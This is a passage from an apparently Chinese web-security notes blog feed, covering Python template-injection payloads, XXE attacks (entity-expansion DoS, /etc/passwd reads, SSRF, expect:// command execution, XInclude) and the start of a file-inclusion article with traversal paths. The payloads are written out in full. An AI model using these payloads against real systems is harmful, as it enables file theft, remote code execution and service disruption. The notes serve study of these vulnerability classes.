&lt;p&gt;python 中类对象的  &lt;code&gt;__mro__&lt;/code&gt;  属性会返回一个 tuple 对象，其中包含了当前类对象所有继承的基类，tuple 中元素的顺序是 MRO（Method Resolution Order） 寻找的顺序。&lt;/p&gt;
&lt;h2 id=&#34;__globals__&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#__globals__&#34;&gt;#&lt;/a&gt;  &lt;code&gt;__globals__&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;保存了函数所有的所有全局变量，在利用中，可以使用  &lt;code&gt;__init__&lt;/code&gt;  获取对象的函数，并通过  &lt;code&gt;__globals__&lt;/code&gt;  获取  &lt;code&gt;file&lt;/code&gt;   &lt;code&gt;os&lt;/code&gt;  等模块以进行下一步的利用&lt;/p&gt;
&lt;h2 id=&#34;__subclasses__&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#__subclasses__&#34;&gt;#&lt;/a&gt;  &lt;code&gt;__subclasses__()&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;python 的新式类都保留了它所有的子类的引用， &lt;code&gt;__subclasses__()&lt;/code&gt;  这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。&lt;/p&gt;
&lt;p&gt;因为 python 中的类都是继承 object 的，所以只要调用 object 类对象的  &lt;code&gt;__subclasses__()&lt;/code&gt;  方法就可以获取想要的类的对象。&lt;/p&gt;
&lt;h1 id=&#34;常见payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见payload&#34;&gt;#&lt;/a&gt; 常见 Payload&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;().__class__.__bases__[0].__subclasses__()[40](r&#39;/etc/passwd&#39;).read()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&amp;quot;os&amp;quot;).popen(&amp;quot;ls /&amp;quot;).read()&#39; )&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;绕过技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过技巧&#34;&gt;#&lt;/a&gt; 绕过技巧&lt;/h1&gt;
&lt;h2 id=&#34;字符串拼接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#字符串拼接&#34;&gt;#&lt;/a&gt; 字符串拼接&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;request[&#39;__cl&#39;+&#39;ass__&#39;].__base__.__base__.__base__[&#39;__subcla&#39;+&#39;sses__&#39;]()[60]
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;使用参数绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用参数绕过&#34;&gt;#&lt;/a&gt; 使用参数绕过&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;params = &amp;#123;
    &#39;clas&#39;: &#39;__class__&#39;,
    &#39;mr&#39;: &#39;__mro__&#39;,
    &#39;subc&#39;: &#39;__subclasses__&#39;
&amp;#125;
data = &amp;#123;
    &amp;quot;data&amp;quot;: &amp;quot;&amp;#123;&amp;#123;&#39;&#39;[request.args.clas][request.args.mr][1][request.args.subc]()&amp;#125;&amp;#125;&amp;quot;
&amp;#125;
r = requests.post(url, params=params, data=data)
print(r.text)
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yODgyMzkzMw==&#34;&gt;服务端模版注入&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Jsb2cua25vd25zZWMuY29tLzIwMTYvMDIvdXNlLXB5dGhvbi1mZWF0dXJlcy10by1leGVjdXRlLWFyYml0cmFyeS1jb2Rlcy1pbi1qaW5qYTItdGVtcGxhdGVzLw==&#34;&gt;用 Python 特性任意代码执行&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/XXE/</guid>
            <title>XXE</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/XXE/</link>
            <category>网络安全</category>
            <category>漏洞</category>
            <category>XXE</category>
            <category>XML</category>
            <pubDate>Sun, 27 Nov 2022 09:31:19 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;xml基础&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xml基础&#34;&gt;#&lt;/a&gt; XML 基础&lt;/h1&gt;
&lt;p&gt;XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素。目前，XML 文件作为配置文件（Spring、Struts2 等）、文档结构说明文件（PDF、RSS 等）、图片格式文件（SVG header）应用比较广泛。 XML 的语法规范由 DTD （Document Type Definition）来进行控制。&lt;/p&gt;
&lt;h1 id=&#34;基本语法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基本语法&#34;&gt;#&lt;/a&gt; 基本语法&lt;/h1&gt;
&lt;p&gt;XML 文档在开头有  &lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot; standalone=&amp;quot;yes&amp;quot;?&amp;gt;&lt;/code&gt;  的结构，这种结构被称为 XML prolog ，用于声明 XML 文档的版本和编码，是可选的，但是必须放在文档开头。&lt;/p&gt;
&lt;p&gt;除了可选的开头外，XML 语法主要有以下的特性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;所有 XML 元素都须有关闭标签&lt;/li&gt;
&lt;li&gt;XML 标签对大小写敏感&lt;/li&gt;
&lt;li&gt;XML 必须正确地嵌套&lt;/li&gt;
&lt;li&gt;XML 文档必须有根元素&lt;/li&gt;
&lt;li&gt;XML 的属性值需要加引号&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;另外，XML 也有 CDATA 语法，用于处理有多个字符需要转义的情况。&lt;/p&gt;
&lt;h1 id=&#34;xxe&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xxe&#34;&gt;#&lt;/a&gt; XXE&lt;/h1&gt;
&lt;p&gt;当允许引用外部实体时，可通过构造恶意的 XML 内容，导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等后果。一般的 XXE 攻击，只有在服务器有回显或者报错的基础上才能使用 XXE 漏洞来读取服务器端文件，但是也可以通过 Blind XXE 的方式实现攻击。&lt;/p&gt;
&lt;h1 id=&#34;攻击方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击方式&#34;&gt;#&lt;/a&gt; 攻击方式&lt;/h1&gt;
&lt;h2 id=&#34;拒绝服务攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#拒绝服务攻击&#34;&gt;#&lt;/a&gt; 拒绝服务攻击&lt;/h2&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;figcaption data-lang=&#34;XML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token doctype&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;token doctype-tag&#34;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&#34;token name&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token internal-subset&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;!ELEMENT&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;(#ANY)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;!ENTITY&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;a0&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;&#34;dos&#34;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;!ENTITY&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;a1&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;&#34;&amp;amp;a0;&amp;amp;a0;&amp;amp;a0;&amp;amp;a0;&amp;amp;a0;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;!ENTITY&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;a2&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;&#34;&amp;amp;a1;&amp;amp;a1;&amp;amp;a1;&amp;amp;a1;&amp;amp;a1;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token entity named-entity&#34; title=&#34;&amp;a2;&#34;&gt;&amp;amp;a2;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。 具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。&lt;/p&gt;
&lt;h2 id=&#34;文件读取&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件读取&#34;&gt;#&lt;/a&gt; 文件读取&lt;/h2&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;figcaption data-lang=&#34;XML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token prolog&#34;&gt;&amp;lt;?xml version=&#34;1.0&#34;?&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token doctype&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;token doctype-tag&#34;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&#34;token name&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token internal-subset&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;!ELEMENT&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;(#ANY)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;lt;!ENTITY file SYSTEM &#34;file:///etc/passwd&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token entity named-entity&#34; title=&#34;&amp;file;&#34;&gt;&amp;amp;file;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;ssrf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssrf&#34;&gt;#&lt;/a&gt; SSRF&lt;/h2&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;figcaption data-lang=&#34;XML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token prolog&#34;&gt;&amp;lt;?xml version=&#34;1.0&#34;?&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token doctype&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;token doctype-tag&#34;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&#34;token name&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token name&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://publicServer.com/&#34;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token internal-subset&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;!ELEMENT&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;(#ANY)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;4&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;rce&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rce&#34;&gt;#&lt;/a&gt; RCE&lt;/h2&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;figcaption data-lang=&#34;XML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token prolog&#34;&gt;&amp;lt;?xml version=&#34;1.0&#34;?&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token doctype&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;token doctype-tag&#34;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&#34;token name&#34;&gt;GVI&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token internal-subset&#34;&gt; &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;!ELEMENT&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;foo&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;ANY&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;lt;!ENTITY xxe SYSTEM &#34;expect://id&#34; &gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;catalog&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;core&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;test101&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;description&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token entity named-entity&#34; title=&#34;&amp;xxe;&#34;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;description&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;core&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;catalog&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;xinclude&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xinclude&#34;&gt;#&lt;/a&gt; XInclude&lt;/h2&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;figcaption data-lang=&#34;XML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token prolog&#34;&gt;&amp;lt;?xml version=&#39;1.0&#39;?&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;data&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;xmlns:&lt;/span&gt;xi&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;http://www.w3.org/2001/XInclude&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token namespace&#34;&gt;xi:&lt;/span&gt;include&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;http://publicServer.com/file.xml&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;token namespace&#34;&gt;xi:&lt;/span&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy53M3NjaG9vbC5jb20uY24veG1sLw==&#34;&gt;XML 教程&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zZWN1cml0eS50ZW5jZW50LmNvbS9pbmRleC5waHAvYmxvZy9tc2cvNjk=&#34;&gt;未知攻焉知防 XXE 漏洞攻防&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hcnRpY2xlcy93ZWIvOTc4MzMuaHRtbA==&#34;&gt;XXE 攻击笔记分享&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjg4Nw==&#34;&gt;从 XML 相关一步一步到 XXE 漏洞&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/includefile/</guid>
            <title>文件包含</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/includefile/</link>
            <category>包含</category>
            <category>文件</category>
            <category>目录</category>
            <pubDate>Sat, 26 Nov 2022 21:02:44 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;基础&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基础&#34;&gt;#&lt;/a&gt; 基础&lt;/h2&gt;
&lt;p&gt;常见的文件包含漏洞的形式为  &lt;code&gt;&amp;lt;?php include(&amp;quot;inc/&amp;quot; . $_GET[&#39;file&#39;]); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;考虑常用的几种包含方式为&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;同目录包含  &lt;code&gt;file=.htaccess&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;目录遍历  &lt;code&gt;?file=../../../../../../../../../var/lib/locate.db&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;日志注入  &lt;code&gt;?file=../../../../../../../../../var/log/apache/error.log&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;利用  &lt;code&gt;/proc/self/environ&lt;/code&gt;&lt;/li&gt;
